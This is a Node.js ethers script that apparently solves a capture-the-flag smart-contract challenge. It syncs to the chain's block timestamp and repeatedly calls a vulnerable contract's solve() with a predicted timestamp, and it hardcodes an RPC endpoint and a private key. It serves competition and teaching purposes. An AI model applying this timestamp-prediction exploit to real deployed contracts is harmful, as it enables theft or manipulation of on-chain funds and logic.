const { ethers } = require("/usr/lib/node_modules/ethers");

function init_ether(
    provider_addr,
    privkey,
    contract_addr,
    abi,
) {
    if (!abi) abi = [];
    const provider = new ethers.providers.JsonRpcProvider(
        provider_addr,
    )
    const signer = new ethers.Wallet(
        privkey,
        provider
    )
    const ChallContact = new ethers.Contract(contract_addr, abi, signer)
    return ChallContact
}

async function main() {
    let provider_addr = "http://challs.htsp.ro:9001/48403406-2666-4ade-80fe-41d4e9681312"
    let privkey = "0x3411d2d9bd7ec46b98afb3f4d2f34f2f008e35715fd7cd08fc22ff038688968c"
    let current_contract_addr = "0x50e4cc2aAED0c8c5D9cabcfB08aBa9F9fBd068d8"

    const CurrentABI = [
        "function isSolved() view returns (bool)"
    ]
    const CurrentContract = init_ether(
        provider_addr,
        privkey,
        current_contract_addr,
        CurrentABI
    )

    // let vuln_address = await CurrentContract.provider.getStorageAt(CurrentContract.address, 0)
    // vuln_address = "0x" + vuln_address.substring(vuln_address.length - 40, vuln_address.length)
    let vuln_address = "0x0518a545fd6eb5de4992ffc1101aee61c613d022"
    console.log("vuln address @ %s", vuln_address)

    const ABI = [{"inputs":[],"name":"current_timestamp","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_guess","type":"uint256"}],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"solved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]
    const VulnContract = init_ether(
        provider_addr,
        privkey,
        vuln_address,
        ABI
    )


    // get timestamp diff
    console.log(await VulnContract.functions.solve("0x0"))
    let block_latest = await VulnContract.provider.getBlock("latest")
    let server_timestamp = block_latest.timestamp
    let block_number = block_latest.number

    console.log("block number: %d", block_number)
    console.log("server timestamp: %d", server_timestamp)
    let local_timestamp = parseInt(Date.now().toString().substring(0, 10))
    console.log("local timestamp: %d", local_timestamp)

    // calculate diff
    let timestamp_diff = local_timestamp - server_timestamp
    console.log("diff: ", timestamp_diff)


    while (true) {
        // call solve
        let timestamp = (parseInt(Date.now().toString().substring(0,10)) - timestamp_diff)+8
        console.log("timestamp: %d", timestamp)
        let solve = await VulnContract.solve(timestamp)
        console.log(await solve.wait())
        // get solve timestamp
        let get_latest = await VulnContract.provider.getBlock("latest")
        let solve_timestamp = get_latest.timestamp
        console.log("solve timestamp: %d", solve_timestamp)

        console.log("diff: %d", (timestamp - solve_timestamp))

        // check isSolved()
        let isSolved = await CurrentContract.functions.isSolved()
        console.log(isSolved)
    }
}

if (require.main == module) {
    main()
}